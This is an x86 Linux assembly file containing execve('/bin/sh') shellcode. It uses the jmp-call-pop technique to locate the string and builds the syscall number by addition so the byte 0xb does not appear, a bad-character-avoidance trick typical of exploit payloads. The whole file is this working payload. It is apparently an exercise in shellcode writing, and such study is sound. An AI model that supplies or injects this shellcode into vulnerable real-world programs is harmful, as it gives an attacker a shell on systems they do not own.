global _start

section .text

_start:

    jmp message         ; push "/bin/sh" onto the stack

    ; eax - syscall
    ; ebx - first parameter
    ; ecx - second parameter
    ; edx - third parameter

mystart:
    xor     eax, eax    ; clear eax
    push    eax         ; push NULL onto stack
    pop     edx         ; third parameter - NULL
    pop     ebx         ; first parameter - "/bin/sh"
    push    eax         ; push NULL onto stack
    mov     eax, ebx    ; copy ebx into eax
    push    eax         ; push "/bin/sh" onto the stack
    push    esp         ; assign pointer to start of the stack
    pop     ecx         ; second parameter - pointer to {"/bin/sh", NULL} 
    xor     eax, eax    ; clear eax
    mov     al, 0x5     ; syscall number for __execve
    add     al, 0x6     ; syscall is 0xb, the addition is done because
                        ; 0xb is TAB in ASCII and will affect the shellcode
    int 0x80
    
    message:
    
    call     mystart
    db     "/bin/sh"
    
section .data
